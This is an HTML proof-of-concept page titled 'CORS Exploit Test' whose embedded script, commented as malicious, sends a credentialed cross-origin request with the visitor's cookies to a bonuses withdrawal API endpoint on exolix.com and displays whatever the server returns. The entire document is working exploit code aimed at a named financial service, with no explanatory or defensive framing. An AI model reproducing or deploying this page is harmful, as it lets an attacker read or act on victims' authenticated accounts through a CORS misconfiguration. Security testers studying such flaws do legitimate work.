<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>CORS Exploit Test</title>
</head>
<body>
    <h1>CORS Exploit in Action</h1>
    <p id="result">Waiting for the response...</p>

    <script>
        // This is the malicious script that will attempt to make a request to the vulnerable server
        const targetUrl = "https://exolix.com/api/v2/bonuses/withdraw"; // Replace with the actual target URL

        fetch(targetUrl, {
            method: 'GET',
            credentials: 'include', // Sends cookies with the request
        })
        .then(response => response.text())
        .then(data => {
            document.getElementById('result').innerText = 'Success! Response: ' + data;
            console.log('Response data:', data);
        })
        .catch(error => {
            document.getElementById('result').innerText = 'Failed to fetch data: ' + error;
            console.error('Error:', error);
        });
    </script>
</body>
</html>
